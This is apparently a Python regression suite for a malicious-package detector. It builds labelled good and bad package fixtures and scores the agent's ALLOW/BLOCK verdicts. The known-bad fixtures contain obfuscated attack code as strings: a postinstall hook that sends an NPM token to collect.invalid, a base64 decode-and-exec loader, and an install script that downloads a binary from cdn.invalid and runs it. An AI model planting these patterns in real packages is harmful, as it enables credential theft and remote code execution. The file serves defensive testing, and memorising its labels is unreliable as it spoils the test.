#!/usr/bin/env python3
"""Focused fact-correlation regression suite for the packages track."""
from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-good", "deferred-credential-client", {
        "setup.py": "name = 'publish-client'\n",
        "publish_client.py": (
            "import os, requests, base64\n\n"
            "def publish():\n"
            "    key_name = 'SERVICE_' + 'TOKEN'\n"
            "    secret = os.getenv(key_name)\n"
            "    packed = base64.b64encode(secret.encode())\n"
            "    return requests.post('https://api.example.test/publish', data=packed)\n"
        ),
    }, []),
    ("known-bad", "install-obfuscated-credential-exfil", {
        "package.json": json.dumps({
            "name": "install-obfuscated-credential-exfil",
            "scripts": {"postinstall": "python scripts/boot.py"},
        }),
        "scripts/boot.py": (
            "import os, requests, base64\n"
            "key_name = 'NPM_' + 'TOKEN'\n"
            "secret = os.getenv(key_name)\n"
            "packed = base64.b64encode(secret.encode())\n"
            "requests.post('https://collect.invalid/install', data=packed)\n"
        ),
    }, [
        ("install_hook_exec", "package.json"),
        ("credential_theft", "scripts/boot.py"),
    ]),
    ("known-good", "import-decoded-data", {
        "setup.py": "name = 'decoded-config'\n",
        "decoded_config.py": (
            "import base64, json\n"
            "decoder = getattr(base64, 'b64' + 'decode')\n"
            "payload = decoder('eyJtb2RlIjoic2FmZSJ9')\n"
            "CONFIG = json.loads(payload)\n"
        ),
    }, []),
    ("known-bad", "import-decoded-execution", {
        "setup.py": "name = 'opaque-loader'\n",
        "opaque_loader.py": (
            "import base64, builtins\n"
            "decoder = getattr(base64, 'b64' + 'decode')\n"
            "runner = getattr(builtins, 'ex' + 'ec')\n"
            "payload = decoder('cHJpbnQoMSk=')\n"
            "runner(payload)\n"
        ),
    }, [
        ("import_side_effect", "opaque_loader.py"),
    ]),
    ("known-good", "install-download-only", {
        "package.json": json.dumps({
            "name": "downloaded-data",
            "scripts": {"postinstall": "python scripts/fetch_schema.py"},
        }),
        "scripts/fetch_schema.py": (
            "import urllib.request, hashlib\n"
            "destination = 'schemas/api.json'\n"
            "download = getattr(urllib.request, 'url' + 'retrieve')\n"
            "download('https://schemas.example.test/api.json', destination)\n"
            "print(hashlib.sha256(open(destination, 'rb').read()).hexdigest())\n"
        ),
    }, []),
    ("known-bad", "install-download-write-execute", {
        "package.json": json.dumps({
            "name": "downloaded-helper",
            "scripts": {"postinstall": "python scripts/bootstrap.py"},
        }),
        "scripts/bootstrap.py": (
            "import urllib.request, subprocess\n"
            "destination = '/tmp/' + 'helper'\n"
            "download = getattr(urllib.request, 'url' + 'retrieve')\n"
            "runner = getattr(subprocess, 'ru' + 'n')\n"
            "download('https://cdn.invalid/helper', destination)\n"
            "runner([destination])\n"
        ),
    }, [
        ("install_hook_exec", "package.json"),
    ]),
)


def materialise(root: Path) -> None:
    for label, name, files, findings in CASES:
        artifact = root / "packages" / label / name
        artifact.mkdir(parents=True)
        for rel, text in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
        expected = [
            {
                "category": category,
                "severity": "CRIT",
                "plane": "action",
                "title": category.replace("_", " "),
                "evidence_ref": ref,
            }
            for category, ref in findings
        ]
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"packages/{label}/{name}",
            "track": "packages",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "BLOCK",
                "risk_score": 0 if label == "known-good" else 90,
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": expected,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="agent/phylax_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent

    with tempfile.TemporaryDirectory(prefix="phylax-packages-wave4-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-packages-wave4-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "packages", work)
            score, rows, detail = local_eval.score_detonation_track(
                agent, corpus, "packages", "packages-wave4-trackcheck", 1, 60, False
            )
            print(f"packages-wave4: score={score:.4f}  {detail}")
            for ref, verdict, note in rows:
                print(f"  {ref:<68} {verdict:<6} {note}")
            return 1 if score < 0.9999 else 0


if __name__ == "__main__":
    raise SystemExit(main())
